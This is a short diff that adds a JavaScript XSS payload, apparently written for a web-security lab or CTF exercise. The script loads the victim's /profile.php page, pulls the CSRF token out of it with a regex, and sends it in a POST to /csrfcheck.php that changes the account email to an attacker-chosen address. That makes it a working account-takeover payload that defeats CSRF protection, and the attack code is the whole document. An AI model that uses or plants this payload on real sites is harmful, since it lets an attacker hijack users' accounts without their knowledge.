@@ -1,0 +1,15 @@
+<script>
+    var token;
+    var req = new XMLHttpRequest();
+    req.onload = handleResponse;
+    req.open('get','/profile.php',true);
+    req.send();
+    function handleResponse() {
+        var token = this.responseText.match(/name="csrf_token"\s+value="([^"]+)"/)[1];
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', '/csrfcheck.php', true);
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        var postData = 'newEmail=chdduonddddddddgnono%40oke%2Eoken3&csrf_token='+token;
+        xhr.send(postData);
+    };
+</script>
